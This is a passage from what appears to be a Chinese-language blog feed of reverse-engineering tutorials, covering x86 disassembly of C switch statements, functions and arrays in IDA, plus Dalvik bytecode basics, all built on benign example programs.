<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/image-20230306170007355.png" class title="image-20230306170007355">

<p>Switch流程分支图如下</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80--%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/image-20230306170109505.png" class title="image-20230306170109505">

<p>观察可以得到左边的四个分支为case分支，右边那个为default部分。</p>
<p>我们先来看下scanf()函数部分反汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401028                 mov     [ebp+var_4], 0</span><br><span class="line">.text:0040102F                 lea     eax, [ebp+var_4]</span><br><span class="line">.text:00401032                 push    eax</span><br><span class="line">.text:00401033                 push    offset aD       ; &quot;%d&quot;</span><br><span class="line">.text:00401038                 call    _scanf</span><br><span class="line">.text:0040103D                 add     esp, 8</span><br></pre></td></tr></table></figure>

<p>这里的var_4就是nNum变量，首先使用mov为nNum变量赋值，然后将其地址送入ecx寄存器，然后通过调用scanf()函数,nNum接受用户输入，函数调用完后将esp恢复到调用前</p>
<p>接受用户输入后，就进入了Switch()分支的部分，反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401040                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401043                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401046                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:00401049                 sub     edx, 1          ; switch 4 cases</span><br><span class="line">.text:0040104C                 mov     [ebp+var_8], edx</span><br><span class="line">.text:0040104F                 cmp     [ebp+var_8], 3</span><br><span class="line">.text:00401053                 ja      short def_401058 ; jumptable 00401058 default case</span><br><span class="line">.text:00401055                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:00401058                 jmp     ds:jpt_401058[eax*4] ; switch jump</span><br></pre></td></tr></table></figure>

<p>从00401040到00401053地址之间的代码是为了对nNum变量进行判断，若nNum-1的值大于3，则跳转到401058地址(default语句)，如不符合则执行Case语句。这就是流程图被分为两个部分的原因。</p>
<p>接下来我们来看看要执行的case分支，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401055                 mov     eax, [ebp+var_8]</span><br><span class="line">.text:00401058                 jmp     ds:jpt_401058[eax*4] ; switch jump</span><br></pre></td></tr></table></figure>

<p>将var_8的值传递给eax寄存器，然后跳转jpt_401058[eax* 4],像是一个数组，数组下标由eax寄存器进行寻址。</p>
<p>jpt_401058处的内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">04010BB jpt_401058      dd offset loc_40105F    ; DATA XREF: _main_0+48↑r</span><br><span class="line">.text:004010BB                 dd offset loc_40106E    ; jump table for switch statement</span><br><span class="line">.text:004010BB                 dd offset loc_40107D</span><br><span class="line">.text:004010BB                 dd offset loc_40108C</span><br><span class="line">.text:004010CB                 align 40h</span><br></pre></td></tr></table></figure>

<p>其内容为4个连续的标号地址，为40105F、40106E、40107D、40108C，分别对应4个Case的代码，通过var_8中对应的值进行访问。</p>
<h3 id="结构小结-1"><a href="#结构小结-1" class="headerlink" title="结构小结"></a>结构小结</h3><p>Switch结构分支通过一次比较就可分为case和default两个流程，在case分支中，通过将传入变量的值为跳转数组下标来访问对应case子分支的执行语句。</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础-函数的识别</title>
    <url>/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础-函数的识别"><a href="#C语言代码逆向基础-函数的识别" class="headerlink" title="C语言代码逆向基础-函数的识别"></a>C语言代码逆向基础-函数的识别</h1><p>当函数执行时，程序流转会转到函数体的实现地址处，只有遇到return或者”}”符号才返回到下一跳语句的地址处，并且很多高级语言在传递参数时会执行将实参复制给形参这一操作。下面我们来看看函数的具体操作。</p>
<h2 id="函数工作原理"><a href="#函数工作原理" class="headerlink" title="函数工作原理"></a>函数工作原理</h2><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p>栈在内存中是一块特殊的存储空间，存储原则是“先进后出”。汇编指令通常使用PUSH和POP指令对栈空间执行数据压入和数据出栈操作。使用esp(栈顶寄存器)和ebp(栈底寄存器)每4个字节的栈空间保存一个数据，并且栈通常是由高地址向低地址延伸。</p>
<p><strong>栈平衡</strong>：在进入某个函数实现时，一般会预先保存栈底指针ebp，以便函数退出后还原到以前的栈顶。退出函数后会将ebp和esp进行对比，检测当前栈帧是否正确关闭，若不平衡则调用_chkesp函数弹窗提示错误。</p>
<h2 id="简单C语言函数调用程序"><a href="#简单C语言函数调用程序" class="headerlink" title="简单C语言函数调用程序"></a>简单C语言函数调用程序</h2><p>方便介绍关于函数的识别，首先写一个简单的C语言程序，并通过编译软件进行编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* szStr, <span class="keyword">int</span> nNum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s,%d \r\n&quot;</span>, szStr, nNum);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, szStr, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nNum = test(<span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d \r\n&quot;</span>, nNum);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>使用IDA打开其编译文件下生成的DEGUB文件夹下生成的可执行文件exe进行逆向分析</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306102359476.png" class title="image-20230306102359476">

<h2 id="函数的逆向分析"><a href="#函数的逆向分析" class="headerlink" title="函数的逆向分析"></a>函数的逆向分析</h2><p>IDA识别出跳转到main()函数的跳表项，切换到文本视图，可以找到main()的跳表项</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306102811711.png" class title="image-20230306102811711">



<p>但并不是每个程序都能被IDA识别跳转到main()函数的跳表项，我们选择exports窗口，这里显示的是程序的入口函数，可以看到start,这是有编译器插入的函数。是编译后的启动函数。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230305181647077.png" class title="image-20230305181647077">



<p>点击可以看到mainCRTStartup代码，<strong>在C语言中main()不是程序运行的第一个函数，而是程序员编写程序时的第一个函数，main()函数是由启动函数来调用的</strong>。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306102216789.png" class title="image-20230306102216789">

<p>从反汇编代码中可以看到，启动函数从004011D0地址处开始，通过调用一系列启动所需工作后(GetVersion()函数、GetCommandLineA()函数等)，在004012B4处调用了_main.</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306103124003.png" class title="image-20230306103124003">



<p>在VC中，启动函数会依次调用GetVersion()、GetCommandLineA()、GetEnvironmentStringA()等函数这一明显特征，在调用完GetEnviro nmentStringA()函数后有三个PUSH操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004012A0                 mov     edx, envp</span><br><span class="line">.text:004012A6                 push    edx             ; envp</span><br><span class="line">.text:004012A7                 mov     eax, argv</span><br><span class="line">.text:004012AC                 push    eax             ; argv</span><br><span class="line">.text:004012AD                 mov     ecx, argc</span><br><span class="line">.text:004012B3                 push    ecx             ; argc</span><br><span class="line">.text:004012B4                 call    _main</span><br></pre></td></tr></table></figure>

<p>该反汇编代码对应的C代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WPRFLAG</span></span><br><span class="line">​             __winitenv = _wenviron;</span><br><span class="line">              mainret = wmain(_argc,_wargv,_wenviron);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> </span></span><br><span class="line">              __initenv = _environ;</span><br><span class="line">              mainret = main(_argc,_grav,_environ);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">​                          </span><br></pre></td></tr></table></figure>

<p>可以看到调用Main()函数时有三个参数，在三个PUSH操作后第一个CALL就是_main的函数地址。在004012C3地址处指令为 _exit,在判断程序是由VC6编译的，找到 _exit的调用，向上找到call指令就为 _main所对应的地址</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306104856179.png" class title="image-20230306104856179">



<p>双击反汇编的_main进入main函数的跳表，通过特征我们可以看到对sub_40100A、printf函数的调用。</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306105349403.png" class title="image-20230306105349403">

<p>函数入口部分地址如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004010A0                 push    ebp</span><br><span class="line">.text:004010A1                 mov     ebp, esp</span><br><span class="line">.text:004010A3                 sub     esp, 44h</span><br><span class="line">.text:004010A6                 push    ebx</span><br><span class="line">.text:004010A7                 push    esi</span><br><span class="line">.text:004010A8                 push    edi</span><br><span class="line">.text:004010A9                 lea     edi, [ebp+var_44]</span><br><span class="line">.text:004010AC                 mov     ecx, 11h</span><br><span class="line">.text:004010B1                 mov     eax, 0CCCCCCCCh</span><br><span class="line">.text:004010B6                 rep stosd</span><br></pre></td></tr></table></figure>

<p>大多数入口处都为push ebp&#x2F; mov ebp,esp &#x2F; sub esp,XXX的形式，完成了保存栈，并开辟当前函数的栈空间。push ebx&#x2F;esi&#x2F;edi是用来保存几个关键寄存器的值，以便函数返回后几个寄存器的值还能继续使用，lea  edi, [ebp+var_44]到rep stosd的指令是将开辟的内存空间全部初始化为0XCC(int 3,调用3号断点产生软件中断)，方便调试。上面代码固定形式，唯一改变的是sub esp,xxx指令，在VC6下使用Debug编译，若当前没有变量则为40h,有一个指令为44h,以此类推，函数编译时总是预留了40h字节的空间。</p>
<p>函数出口代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004010DD                 pop     edi</span><br><span class="line">.text:004010DE                 pop     esi</span><br><span class="line">.text:004010DF                 pop     ebx</span><br><span class="line">.text:004010E0                 add     esp, 44h</span><br><span class="line">.text:004010E3                 cmp     ebp, esp</span><br><span class="line">.text:004010E5                 call    __chkesp</span><br><span class="line">.text:004010EA                 mov     esp, ebp</span><br><span class="line">.text:004010EC                 pop     ebp</span><br><span class="line">.text:004010ED                 retn</span><br><span class="line">.text:004010ED _main_0         endp</span><br></pre></td></tr></table></figure>

<p>与入口代码相同，出口代码也是固定格式，使用pop指令将入口保存的关键寄存器值进行恢复，并且恢复esp指针的值，将临时开辟的栈空间释放掉，可以观察到开辟空间使用sub指令，释放空间使用add指令，由此判断栈的方向是由高向低地址沿伸的，然后使用retn返回上层函数。其中__chkesp函数是检测栈是否平衡，否则给出错误提示。</p>
<p>前面的函数入口代码和出口代码在每个函数中都是类似的，我们再来看下剩余的反汇编代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:004010B8                 push    6               ; int</span><br><span class="line">.text:004010BA                 push    offset Text     ; &quot;hello&quot;</span><br><span class="line">.text:004010BF                 call    sub_40100A</span><br><span class="line">.text:004010C4                 add     esp, 8</span><br><span class="line">.text:004010C7                 mov     [ebp+var_4], eax</span><br><span class="line">.text:004010CA                 mov     eax, [ebp+var_4]</span><br><span class="line">.text:004010CD                 push    eax</span><br><span class="line">.text:004010CE                 push    offset aD       ; &quot;%d \r\n&quot;</span><br><span class="line">.text:004010D3                 call    _printf</span><br><span class="line">.text:004010D8                 add     esp, 8</span><br><span class="line">.text:004010DB                 xor     eax, eax</span><br></pre></td></tr></table></figure>

<p>首先从push 6开始到mov [ebp+var_4],eax这一串指令是主函数对test函数的调用。在VC中，默认使用cddel函数对于参数的传递依靠栈内存依次从右往左送入栈中。在C代码中，我们对test()函数的调用形式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nNum = test(<span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<p>所以第一个指令是PUSH 6，然后才是PUSH offset.接下来的add esp,8指令是将esp恢复到调用前的值，这里的8是将前面的PUSH操作释放内存空间。</p>
<p>函数返回值一般保存在eax寄存器中，mov [ebp+var_4],eax将test函数返回值保存在在[ebp+var_4]中，相当于C语言中的nNum变量。xor eax,eax指令将eax进行清零，即main()函数返回值为0。</p>
<p>接下来，我们来看下test函数，test函数跳表如下：</p>
<img src="/2023/03/06/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E5%87%BD%E6%95%B0%E7%9A%84%E8%AF%86%E5%88%AB/image-20230306114357641.png" class title="image-20230306114357641">

<p>除去入口和出口代码，中间的代码主要为printf()函数和MessageBoxA()函数的反汇编代码。</p>
<p>调用printf()函数的反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401038                 mov     eax, [ebp+arg_4]</span><br><span class="line">.text:0040103B                 push    eax</span><br><span class="line">.text:0040103C                 mov     ecx, [ebp+lpText]</span><br><span class="line">.text:0040103F                 push    ecx</span><br><span class="line">.text:00401040                 push    offset Format   ; &quot;%s,%d \r\n&quot;</span><br><span class="line">.text:00401045                 call    _printf</span><br><span class="line">.text:0040104A                 add     esp, 0Ch</span><br></pre></td></tr></table></figure>

<p>调用MessageBoxA()函数的反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0040104F                 push    0               ; uType</span><br><span class="line">.text:00401051                 push    0               ; lpCaption</span><br><span class="line">.text:00401053                 mov     edx, [ebp+lpText]</span><br><span class="line">.text:00401056                 push    edx             ; lpText</span><br><span class="line">.text:00401057                 push    0               ; hWnd</span><br><span class="line">.text:00401059                 call    ds:MessageBoxA</span><br></pre></td></tr></table></figure>

<p>其中两个代码中间还有个add esp,oCh，是将esp恢复到函数调用前的值。而MessageBoxA()函数为Windows系统下的API函数，使用stdcall调用约定，参数的平栈是在API函数里面进行的。</p>
<p>这两个函数调用指令也存在区别，由于printf()函数是属于C语言的静态库，在连接时会将其代码二进制文件中，而MessageBoxA函数是在user32.dll这个动态连接库中，只保留了其入口地址，没有具体代码连接，而其代码在数据节中，使用”ds:”前缀</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在逆向分析函数时</p>
<ul>
<li>首先确定函数起始位置，通常由IDA自动识别</li>
<li>掌握函数的调用约定和确定函数的参数个数，通过平栈的方式和平栈时对esp操作的值来进行判断</li>
<li>最后观察函数的返回值，通常关注esp的值，可以确定返回值的类型，然后进一步考虑函数调用方下一步的操作。</li>
</ul>
<p><strong>启动函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetVersion(): 获取当前运行平台的版本号</span><br><span class="line">_heap_init(): 用于初始化堆空间，使用heapcreate申请堆空间，申请空间由_heap_init_传递的参数决定，_sbh_heap_init()用于初始化堆结构信息</span><br><span class="line">GetCommandLineA(): 获取命令行参数信息的首地址</span><br><span class="line">_crtGetenvironmentStringA(): 获取环境变量信息的首地址</span><br><span class="line">_setargv(): 将获取的命令行参数进行分析，将分离出的参数个数保存在全局变量_argc中，将命令行参数首地址存放在全局变量_argv中</span><br><span class="line">_setenvp(): 获取环境变量信息的首地址，将环境变量首地址放在全局变量env中</span><br><span class="line"></span><br><span class="line">_argc、_argv、env这三个全局变量作为参数</span><br><span class="line"></span><br><span class="line">_cinit(): 用于全局数据和浮点寄存器的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>调用流程</strong></p>
<ul>
<li><p>参数传递 。</p>
<p>通过栈或者寄存器方式传递参数</p>
</li>
<li><p>函数调用，返回地址压栈。</p>
<p>使用call指令调用参数，将返回地址压入栈中</p>
</li>
<li><p>保存栈底。</p>
<p>使用栈底空间保存调用方式的栈底寄存器ebp</p>
</li>
<li><p>申请栈空间和保存寄存器环境。</p>
<p>根据函数内局部变量的大小抬高栈顶让出对应的栈空间，并且将修改的寄存器保存在栈内</p>
</li>
<li><p>函数实现代码</p>
</li>
</ul>
<p>​       函数实现过程的代码</p>
<ul>
<li><p>还原环境</p>
<p>还原栈中保存的寄存器信息</p>
</li>
<li><p>平衡栈空间</p>
<p>平衡局部变量使用的栈空间</p>
</li>
<li><p>ret返回，结束函数调用</p>
<p>在栈顶取出保存的返回地址，更新EIP</p>
<p>在非_cdecl调用方式下，平衡参数占用栈空间</p>
</li>
<li><p>调整esp，平衡栈顶</p>
<p>此处为_cdecl特有的方式，用于平衡参数占用的栈顶</p>
</li>
</ul>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>C/C++</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>App逆向案例-dudu牛</title>
    <url>/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="Dalvik字节码"><a href="#Dalvik字节码" class="headerlink" title="Dalvik字节码"></a>Dalvik字节码</h1><p>Dalvik中的寄存器都是32位大小，支持所有类型</p>
<h2 id="寄存器命名"><a href="#寄存器命名" class="headerlink" title="寄存器命名"></a>寄存器命名</h2><p>寄存器命名有两种： V命名法和p命名法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V命名法：</span><br><span class="line">局部变量寄存器:V0  -  Vn  </span><br><span class="line">参数寄存器：Vn  -   Vn+m</span><br><span class="line"></span><br><span class="line">P命名法：</span><br><span class="line">变量寄存器：V0  -  Vn</span><br><span class="line">参数寄存器：P0  -  Pn</span><br></pre></td></tr></table></figure>

<p>这两种命名法区别在于参数寄存器的命名</p>
<h2 id="字节码类型"><a href="#字节码类型" class="headerlink" title="字节码类型"></a>字节码类型</h2><p>Dalvik字节码类型于java基本数据类型对应关系如下</p>
<img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230627224658292.png" class title="image-20230627224658292">

<h2 id="方法-字段"><a href="#方法-字段" class="headerlink" title="方法+字段"></a>方法+字段</h2><p>Dalvik表示字段的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型(包名+类名); -&gt; 字段名称:字段类型</span><br></pre></td></tr></table></figure>

<p>Dalvik表示方法的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型(包名+类名); -&gt; 方法名称(参数类型):返回值类型</span><br></pre></td></tr></table></figure>



<p>例如：<strong>Lpackage&#x2F;name&#x2F;ObjectName;&gt;FieldName:Ljava&#x2F;lang&#x2F;String;</strong> 其中Lpackage&#x2F;name&#x2F;ObjectName为类名，FieldName为字段名称，Ljava&#x2F;lang&#x2F;String为字段类型。</p>
<p><strong>Lpackage&#x2F;name&#x2F;ObjectName;-&gt;MethodName (III) Z“</strong> 其中Lpackage&#x2F;name&#x2F;ObjectName为类名，MethodNameName为方法名称，(III)为参数类型，表示三个类型为int整数型的参数，Z表示返回值为boolean类型。</p>
<h2 id="dex文件"><a href="#dex文件" class="headerlink" title="dex文件"></a>dex文件</h2><p><strong>java文件 -&gt; class文件 -&gt; smail文件 &lt;- smail文件</strong></p>
<p>使用工具：</p>
<p><strong>dx.jar将.class文件打包成.dex文件</strong></p>
<p><strong>baksmail.jar将.dex文件反汇编为smail文件</strong></p>
<p><strong>smail.jar将.samil文件打包成.dex文件</strong></p>
<h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><p><strong>基础字节码  -   名称后缀&#x2F;字节码后缀   目的寄存器   源寄存器</strong></p>
<p>名称后缀是wide，表示数据宽度为64位</p>
<p>名称后缀位from16，表示源寄存器存储容量为16位</p>
<h3 id="数据定义指令"><a href="#数据定义指令" class="headerlink" title="数据定义指令"></a>数据定义指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702223607266.png" class title="image-20230702223607266">

<h3 id="空操作指令"><a href="#空操作指令" class="headerlink" title="空操作指令"></a>空操作指令</h3><p>助记符为nop，它的值为00，通常被用来作对齐代码之用</p>
<h3 id="数据操作指令"><a href="#数据操作指令" class="headerlink" title="数据操作指令"></a>数据操作指令</h3><p>助记符为move，将源寄存器的值赋给目的寄存器</p>
<img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702223812872.png" class title="image-20230702223812872">

<h3 id="对象操作指令"><a href="#对象操作指令" class="headerlink" title="对象操作指令"></a>对象操作指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702223848050.png" class title="image-20230702223848050">

<h3 id="数组操作指令"><a href="#数组操作指令" class="headerlink" title="数组操作指令"></a>数组操作指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702223938348.png" class title="image-20230702223938348">

<h3 id="数据运算指令"><a href="#数据运算指令" class="headerlink" title="数据运算指令"></a>数据运算指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702224114124.png" class title="image-20230702224114124">

<h3 id="逻辑元算指令"><a href="#逻辑元算指令" class="headerlink" title="逻辑元算指令"></a>逻辑元算指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702224322567.png" class title="image-20230702224322567">

<h3 id="位移指令"><a href="#位移指令" class="headerlink" title="位移指令"></a>位移指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702224428284.png" class title="image-20230702224428284">

<h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><p>其基本格式为：<strong>cmp+kind - type  vAA，vBB，vCC</strong></p>
<img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702224803523.png" class title="image-20230702224803523">

<h3 id="方法调用指令"><a href="#方法调用指令" class="headerlink" title="方法调用指令"></a>方法调用指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702224958823.png" class title="image-20230702224958823">

<h3 id="方法返回指令"><a href="#方法返回指令" class="headerlink" title="方法返回指令"></a>方法返回指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225035442.png" class title="image-20230702225035442">

<h3 id="同步指令"><a href="#同步指令" class="headerlink" title="同步指令"></a>同步指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225101804.png" class title="image-20230702225101804">

<h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225153640.png" class title="image-20230702225153640">

<img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225243896.png" class title="image-20230702225243896">

<img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225254226.png" class title="image-20230702225254226">

<h3 id="数据转换指令"><a href="#数据转换指令" class="headerlink" title="数据转换指令"></a>数据转换指令</h3><img src="/2023/03/12/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/image-20230702225315884.png" class title="image-20230702225315884">

]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言代码逆向基础-数组和指针的寻址</title>
    <url>/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/</url>
    <content><![CDATA[<h1 id="C语言代码逆向基础-数组和指针的寻址"><a href="#C语言代码逆向基础-数组和指针的寻址" class="headerlink" title="C语言代码逆向基础-数组和指针的寻址"></a>C语言代码逆向基础-数组和指针的寻址</h1><p> 数组和指针都是针对地址操作。数组是相同数据类型的数据集合，以线性连续存储在内存中，而指针是一个保存地址值的4字节变量。在使用中，数组名是一个地址常量值，保存数组首元素地址不可修改，以此为基地址访问其他元素；而指针是个变量，只要修改指针中所保存的地址数据就可以随意访问。</p>
<h2 id="数组在函数内"><a href="#数组在函数内" class="headerlink" title="数组在函数内"></a>数组在函数内</h2><p>在函数内定义数组时，该数组为局部变量</p>
<p>数组与局部变量对比如下：</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308210325286.png" class title="image-20230308210325286">

<p>可以观察到数组数据在内存中连续且类型都一致</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308210610587.png" class title="image-20230308210610587">

<p>这里var_14为常量-14，执行“ebp+var_14”后访问的地址最小，以此地址为数组的首地址，数组地址是从低地址向高地址延伸。</p>
<p><strong>字符串初始化为字符数组</strong></p>
<p>就是复制字符串的过程，使用寄存器每次复制4字节的数据，字符串规定最后一个数据使用0来作为字符串结束符。</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308212638598.png" class title="image-20230308212638598">

<p>其反汇编代码如下：</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308211516702.png" class title="image-20230308211516702">

<p>这里使用了eax,ecx,edx三个寄存器，将常量字符串分为3段共12个字节，分为三个寄存器来进行保存实现中间传递。</p>
<p>当字符串不为4的倍数时如何进行传递，请看下面反汇编代码</p>
<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308212717939.png" class title="image-20230308212717939">

<img src="/2023/03/09/C%E8%AF%AD%E8%A8%80%E4%BB%A3%E7%A0%81%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80-%E6%95%B0%E7%BB%84%E5%92%8C%E6%8C%87%E9%92%88%E7%9A%84%E5%AF%BB%E5%9D%80/image-20230308213221776.png" class title="image-20230308213221776">

